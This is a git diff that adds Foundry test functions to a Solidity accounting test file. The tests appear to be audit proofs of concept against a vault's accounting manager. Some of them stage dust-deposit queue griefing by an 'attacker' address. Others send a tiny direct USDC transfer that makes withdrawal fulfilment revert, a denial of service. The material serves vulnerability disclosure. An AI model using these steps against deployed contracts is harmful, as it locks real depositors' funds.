@@ -1,6 +1,9 @@
 // SPDX-License-Identifier: Apache-2.0
 pragma solidity 0.8.20;
 
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import { Vm } from "forge-std/Vm.sol";
 import "./utils/testStarter.sol";
 import "contracts/helpers/BaseConnector.sol";
 import "contracts/accountingManager/NoyaFeeReceiver.sol";
@@ -64,6 +67,7 @@ contract TestAccounting is testStarter, OptimismAddresses {
         accountingManager.updateValueOracle(noyaOracle);
         vm.stopPrank();
     }
+
 
     function testVaultSingleDepositFlow() public {
         console.log("-----------Base Workflow--------------");
@@ -182,6 +186,51 @@ contract TestAccounting is testStarter, OptimismAddresses {
 
         vm.stopPrank();
     }
+
+        function testSlowQueue2() public {
+        console.log("-----------Base Workflow--------------");
+        uint256 _amount = 10_000 * 1e6;
+        uint256 amount2 = 0.1 * 1e6; // Dust Amounts
+        address attacker = makeAddr("attacker");
+        address john = makeAddr("john");
+        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+        _dealWhale(baseToken, address(attacker), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+        _dealWhale(baseToken, address(john), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+        vm.startPrank(address(attacker));
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), type(uint256).max);
+        accountingManager.deposit(address(attacker), amount2, address(0));
+        vm.stopPrank();
+        vm.startPrank(alice);
+        //     // ------------------------------ deposit ------------------------------
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 5 * _amount);
+        accountingManager.deposit(address(alice), _amount, address(0));
+        //     // ------------------------------ check Withdraw queue ------------------------------
+        uint256[] memory arr = new uint256[](5);
+        arr[0] = 0;
+        arr[1] = 1;
+        arr[2] = 2;
+        arr[3] = 3;
+        arr[4] = 4;
+        vm.stopPrank(); // @audit alice stopped here
+        // ----------------------------- Attacker can disturbs with two dust amount again --------------------------------- //
+        vm.startPrank(address(attacker));
+        accountingManager.deposit(address(attacker), amount2, address(0));
+        accountingManager.deposit(address(attacker), amount2, address(0));
+        vm.stopPrank();
+        // ----------------------------- John Trnasaction lies in last of the max-iteration. ------------------------------ //
+        vm.startPrank(address(john));
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), type(uint256).max);
+        accountingManager.deposit(address(john), _amount, address(0));
+        vm.stopPrank();
+        vm.startPrank(owner);
+          //     // ------------------------------ calculate shares ------------------------------
+        accountingManager.calculateDepositShares(5);
+        // ------------------------------ warp the vm time ------------------------------
+        vm.warp(block.timestamp + 35 minutes);
+        accountingManager.executeDeposit(10, connector, "");
+        vm.stopPrank();
+    }
+
 
     function testVaultMultipleDepositFlow() public {
         console.log("-----------Base Workflow--------------");
@@ -471,6 +520,7 @@ contract TestAccounting is testStarter, OptimismAddresses {
         assertEq(accountingManager.neededAssetsForWithdraw(), 0, "neededAssetsForWithdraw is not correct3");
         vm.expectRevert();
         accountingManager.withdraw(20 * _amount, address(alice));
+
         accountingManager.withdraw(2 * _amount, address(alice));
         accountingManager.withdraw(3 * _amount, address(alice));
 
@@ -684,6 +734,170 @@ contract TestAccounting is testStarter, OptimismAddresses {
         // // ------------------------------ execute withdraw ------------------------------
         accountingManager.executeWithdraw(10);
     }
+
+        function testDOS_Withdraw() public {
+        
+        // @audit John is the temporoary Attacker
+        address john = makeAddr("john");
+
+        console.log("-----------Base Workflow--------------");
+        uint256 _amount = 10_000 * 1e6;
+
+        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+        _dealWhale(baseToken, address(john), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+
+        vm.startPrank(alice);
+
+        // ------------------------------ deposit ------------------------------
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 6 * _amount);
+        accountingManager.deposit(address(alice), 6 * _amount, address(0));
+        // ------------------------------ calculate shares ------------------------------
+        vm.stopPrank();
+
+        vm.startPrank(owner);
+
+        accountingManager.calculateDepositShares(10);
+
+        // ------------------------------ warp the vm time ------------------------------
+
+        vm.warp(block.timestamp + 35 minutes);
+
+        accountingManager.executeDeposit(10, connector2, "");
+
+        uint256  availableBal =  accountingManager.balanceOf(address(this));
+        console.log("Available Balance in Accounting Manager" ,availableBal );
+
+        // ------------------------------ withdraw ------------------------------
+        vm.stopPrank();
+        vm.startPrank(alice);
+        accountingManager.withdraw(6 * _amount, address(alice));
+        // ------------------------------ calculate withdraw ------------------------------
+        vm.stopPrank();
+
+        // BUG Attacker activity starts from here
+        vm.startPrank(address(john));
+         // @audit Check here Attacker just minimum amount of the USDC Tokens to cause the DOS 
+        SafeERC20.safeTransfer(IERC20(USDC) , address(accountingManager) ,(0.000001 * 1e6));
+        vm.stopPrank();
+
+        vm.startPrank(owner);
+        accountingManager.calculateWithdrawShares(10);
+
+        vm.warp(block.timestamp + 5 minutes);
+        accountingManager.startCurrentWithdrawGroup();
+
+        console.log(
+            "amount needed to withdraw after startCurrentWithdrawGroup 12v456: %s",
+            accountingManager.neededAssetsForWithdraw()
+        );
+        (, uint256 totalCBAmount,, uint256 totalAVB,,) = accountingManager.currentWithdrawGroup();
+        console.log("totalCBAmount 12456: %s", totalCBAmount);
+        console.log("amountAskedForWithdraw 12456: %s", accountingManager.amountAskedForWithdraw());
+        vm.expectRevert();
+        accountingManager.fulfillCurrentWithdrawGroup();
+
+        RetrieveData[] memory retrieveData = new RetrieveData[](2);
+        retrieveData[0] = RetrieveData(6 * _amount, address(owner), abi.encode(_amount));
+        retrieveData[0] = RetrieveData(6 * _amount, address(connector2), abi.encode(_amount / 2, _amount));
+        vm.expectRevert();
+        accountingManager.retrieveTokensForWithdraw(retrieveData);
+        retrieveData[0] = RetrieveData(6 * _amount, address(connector2), abi.encode(_amount, _amount));
+        vm.expectRevert();
+        accountingManager.retrieveTokensForWithdraw(retrieveData); // Covered coverage bug number 4
+
+        vm.expectRevert();
+        accountingManager.executeWithdraw(10);
+
+        vm.expectRevert();
+        accountingManager.fulfillCurrentWithdrawGroup();
+        // // ------------------------------ execute withdraw ------------------------------
+        vm.expectRevert();
+        accountingManager.executeWithdraw(10);
+    }
+
+    /* ----------------------------------------- New Attacking Vector---------------------------------------------------------------- */
+
+        function testSend_token_Manipulate() public {
+
+        address john = makeAddr("john");
+
+        console.log("-----------Base Workflow--------------");
+        uint256 _amount = 10_000 * 1e6;
+
+        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+        _dealWhale(baseToken, address(john), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
+
+        vm.startPrank(alice);
+
+        // ------------------------------ deposit ------------------------------
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 6 * _amount);
+        accountingManager.deposit(address(alice), 6 * _amount, address(0));
+        // ------------------------------ calculate shares ------------------------------
+        vm.stopPrank();
+
+       vm.startPrank(address(john));
+        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 6 * _amount);
+        accountingManager.deposit(address(john), 6 * _amount, address(0));
+
+       vm.stopPrank();
+
+        vm.startPrank(owner);
+
+        accountingManager.calculateDepositShares(10);
+
+        // ------------------------------ warp the vm time ------------------------------
+
+        vm.warp(block.timestamp + 35 minutes);
+
+        accountingManager.executeDeposit(10, connector2, "");
+
+        uint256  availableBal =  accountingManager.balanceOf(address(this));
+        console.log("Available Balance in Accounting Manager" ,availableBal );
+
+        // ------------------------------ withdraw ------------------------------
+        vm.stopPrank();
+        vm.startPrank(alice);
+        accountingManager.withdraw(6 * _amount, address(alice));
+
+        // ------------------------------ calculate withdraw ------------------------------
+
+        SafeERC20.safeTransfer(IERC20(USDC) , address(accountingManager) ,(0.000001 * 1e6));
+        vm.stopPrank();
+
+        vm.startPrank(owner);
+        accountingManager.calculateWithdrawShares(10);
+
+        vm.warp(block.timestamp + 5 minutes);
+        accountingManager.startCurrentWithdrawGroup();
+
+        console.log(
+            "amount needed to withdraw after startCurrentWithdrawGroup 12456: %s",
+            accountingManager.neededAssetsForWithdraw()
+        );
+        (, uint256 totalCBAmount,, uint256 totalAVB,,) = accountingManager.currentWithdrawGroup();
+        console.log("totalCBAmount 12456: %s", totalCBAmount);
+        console.log("amountAskedForWithdraw 12456: %s", accountingManager.amountAskedForWithdraw());
+        vm.expectRevert();
+        accountingManager.fulfillCurrentWithdrawGroup();
+
+       /* RetrieveData[] memory retrieveData = new RetrieveData[](2);
+        retrieveData[0] = RetrieveData(6 * _amount, address(owner), abi.encode(_amount));
+        retrieveData[0] = RetrieveData(6 * _amount, address(connector2), abi.encode(_amount / 2, _amount));
+        vm.expectRevert();
+        accountingManager.retrieveTokensForWithdraw(retrieveData);
+        retrieveData[0] = RetrieveData(6 * _amount, address(connector2), abi.encode(_amount, _amount));
+        accountingManager.retrieveTokensForWithdraw(retrieveData); // Covered coverage bug number 4 */
+
+        vm.expectRevert();
+        accountingManager.executeWithdraw(10);
+
+
+        accountingManager.fulfillCurrentWithdrawGroup();
+        // // ------------------------------ execute withdraw ------------------------------
+        accountingManager.executeWithdraw(10);
+    }
+    
+    
 
     function testErrors() public {
         console.log("-----------Base Workflow--------------");
